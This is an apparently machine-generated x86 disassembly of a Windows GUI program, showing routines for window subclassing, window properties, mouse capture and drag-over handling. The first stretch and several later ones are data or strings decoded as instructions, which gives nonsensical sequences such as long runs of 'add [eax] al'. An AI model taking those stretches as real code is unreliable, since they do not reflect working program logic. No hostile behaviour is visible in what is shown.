add [ eax + 0x54 ] bh
inc ebx
add [ esp + edx * 2 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edx * 2 + 0x780043 ] ah
add [ eax ] al
xchg esp eax
adc [ eax ] eax
mov [ eax + eax * 2 ] dh
add [ esi + edx * 2 + 0x40 ] cl
add [ eax + 0x56 ] bl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add [ eax + 0x56 ] ch
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] cl
sbb [ eax + eax + 0x5c ] al
sbb [ eax + eax - 0x2c ] al
sbb [ eax + eax - 0x1c ] eax
sbb [ eax + eax - 0x5c ] eax
and [ eax + eax - 0x74 ] eax
and al 0x44
add ah cl
inc esp
add al dl
sub [ eax + eax - 0x2c ] al
sub eax 0x2b880044
inc esp
add [ eax + 0x68004416 ] ah
and eax 0x54090044
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
pop eax
push esi
mov eax eax
cld
push esp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
push esp
inc ebx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x77ffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ edx + edi + 0x54060044 ] bh
dec ebp
outsd
jne r-xdata
inc ebx
add al bh
lodsb [ esi ]
inc ebx
add [ eax ] dl
mov [ ebx ] al
dec eax
jle r-xdata
add [ edx + esi * 4 ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] al
call 0xffffffffbc439709
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
inc ecx
add [ edi + ebp * 4 + 0x43 ] dl
add [ eax + edi * 8 + 0x43 ] dl
add [ eax - 0x3 ] dh
inc ebx
add [ esp + edi * 8 + 0x7d840043 ] bh
inc ebx
add al dl
inc ebx
add al dh
inc ebx
add [ eax ] cl
xchg ebp eax
inc ecx
add al dh
cwde
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x56 ] al
inc ebx
add [ eax ] cl
add al [ eax ]
add [ ebx + ecx * 2 ] cl
inc ebx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
inc ecx
add [ esp + esi - 0x325fffc0 ] bl
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x50 ] bh
inc ebx
add [ eax - 0x3 ] al
inc ebx
add [ eax - 0x3b ] ch
inc ebx
add [ eax + 0x3d ] dl
inc ecx
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dl
jg r-xdata
nop
push eax
push ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x56 ] bl
inc ebx
add [ edi + eax * 8 + 0x43 ] ah
add [ esi + eax * 8 ] bl
inc ebx
add ah al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ eax + edx * 8 ] cl
inc ebx
add [ eax ] dh
add al 0x44
add [ eax - 0x57ffbc12 ] bh
int1
inc ebx
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add ah cl
inc ecx
inc esp
add [ edx + ebp + 0x54120040 ] cl
inc ebx
jne r-xdata
add [ ecx + ecx * 4 - 0x76ebffbd ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] es
aam 0x8a
inc ebx
add [ esp + ecx * 8 ] bh
inc ebx
add [ ebp + ebp * 4 + 0x43 ] bh
add [ eax + esi * 8 + 0x43 ] bl
add [ eax ] bl
int1
inc ebx
add [ esp + ebp * 8 ] dl
inc ebx
add ah bh
adc [ edx + 0x349c0041 ] dl
inc eax
add [ eax - 0xfffbc33 ] ah
je r-xdata
inc ebx
add al bh
lodsb [ esi ]
inc ebx
add [ eax ] dl
mov [ ebx ] al
dec eax
jle r-xdata
add [ edx + esi * 4 ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] al
call 0xffffffffbc439889
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x50 ] bh
inc ebx
add [ eax - 0x3 ] al
inc ebx
inc eax
add [ eax ] dl
xchg edx eax
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ebx
add [ edi + eax * 8 + 0x43 ] ah
add [ esi + eax * 8 ] bl
inc ebx
add ah al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ eax + edx * 8 ] cl
inc ebx
add [ eax ] dh
add al 0x44
add [ eax - 0x57ffbc12 ] bh
int1
inc ebx
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add ah cl
inc ecx
inc esp
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x541d0040 ] cl
inc ebx
jne r-xdata
add [ ecx + ecx * 4 - 0x76ebffbd ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] es
aam 0x8a
inc ebx
add [ esp + ecx * 8 ] bh
inc ebx
add [ ebp + ebp * 4 + 0x43 ] bh
add [ eax + esi * 8 + 0x43 ] bl
add [ eax ] bl
int1
inc ebx
add [ esp + ebp * 8 ] dl
inc ebx
add ah bh
add al dh
int 0x43
insb
nop
pop eax
push esi
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ ebx - 0x6f76f7ab ] cl
add [ ecx ] 0x0
add [ ecx + rw-data ] ah
mov eax [ eax + 0x18c ]
je r-xdata
add [ eax - 0x3b ] ch
inc ebx
add [ eax + 0x3d ] dl
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
jpo r-xdata
insd
dec ebp
jne r-xdata
inc ecx
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dl
jg r-xdata
insb
push eax
push ebp
inc ebx
add al al
dec esi
inc ebx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
inc esi
je r-xdata
inc ecx
add [ edi + ebp * 4 + 0x43 ] dl
add [ eax + edi * 8 + 0x43 ] dl
add [ eax - 0x3 ] dh
inc ebx
add [ esp + edi * 8 + 0x7d840043 ] bh
inc ebx
add al dl
inc ebx
add al dh
inc ebx
add [ eax ] cl
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
outsd
insb
jae r-xdata
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
inc ecx
add [ esp + esi - 0x325fffc0 ] bl
inc ebx
add [ ebp + 0x56d00040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
push edi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
push edi
inc ebx
add [ edx + eax ] cl
add [ eax ] al
add al 0x55
inc ebx
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
push eax
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
outsd
insb
mov eax eax
in al dx
push edi
inc ebx
add [ edi ] al
sbb eax 0x73754354
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
insd
dec ebp
jne r-xdata
je r-xdata
inc ebp
or [ eax - 0x18 ] dl
dec esp
or eax 0xa9fffd
add [ eax ] al
inc eax
je r-xdata
push ebx
insb
arpl [ gs : esp + ecx * 2 + 0x69 ] si
jae r-xdata
push eax
call GetWindowLongA
test eax eax
inc ebx
outsd
outsb
je r-xdata
jne r-xdata
or eax 0xc085fffd
outsd
insb
rcl [ esi + 0x43 ] 0x1
add [ esi + edx * 2 + 0x43 ] dl
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
pop es
paddw mm7 mm7
outsd
insb
jae r-xdata
add [ edx + 0x1ea8010 ] cl
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_435834
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_4358ec
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_435920
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404450
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_4358ec
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_43597c
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_435b60
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40bee8
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_4044b0
mov eax edi
mov edx esi
call sub_403fe4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_435ba4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40bee8
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_4044b0
mov eax edi
mov edx esi
call sub_403fe4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_435c10
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov eax ebx
call sub_43f228
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_435cbc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4137ac
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_435cf0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43f228
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_435d18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_435cf0
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_435cbc
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413650
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_413828
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_435d74
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_413684
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4137ac
mov edx 0x8
call sub_4026dc
inc esi
dec ebx
jne r-xdata
sub_435da8
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4137ac
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_435cbc
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_435e0c
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_435e6c
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4031a8
mov edx esp
mov eax esi
call sub_4041f4
add esp 0x100
pop esi
pop ebx
retn
sub_435ea8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_435f72
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_436fc8
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_436950
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4068a0
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_436950
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_436fc8
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_436950
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_436fc8
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_435f77
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_458560
call sub_403a48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_436fc8
sub_435fd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_435ffa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_436060
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_435e0c
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43608c
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403454
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_4360b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403454
xor edx edx
sub_436110
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_440e4c
sub_436130
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_440e34
sub_436154
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43603c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c808
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_421cfc
mov edx eax
mov eax esi
call sub_41c984
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4361b8
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4361e8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_436060
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_436244
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403454
pop edi
pop esi
pop ebp
retn 0x4
sub_436268
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43628c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_436268
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_436268
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_436348
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_4363b4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_436804
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_435920
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_43f228
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_43f228
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43f228
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403454
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_436348
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_43f228
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_43f228
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43654c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_43f228
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43f228
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_436590
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_435da8
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_4363b4
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4137ac
